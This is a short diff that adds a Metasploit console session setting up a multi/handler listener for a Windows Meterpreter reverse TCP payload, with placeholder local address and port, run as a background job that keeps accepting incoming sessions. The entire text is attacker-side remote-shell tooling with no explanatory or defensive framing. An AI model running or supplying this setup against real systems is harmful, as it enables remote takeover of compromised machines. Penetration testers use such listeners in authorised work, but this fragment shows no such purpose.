@@ -1,0 +1,6 @@
+msf>use exploit multi/handler
+msf>set payload windows/meterpreter/reverse_tcp
+msf>set lhost <local IP>
+msf>set lport <local port>
+msf> set ExitOnSession false
+msf>exploit -j
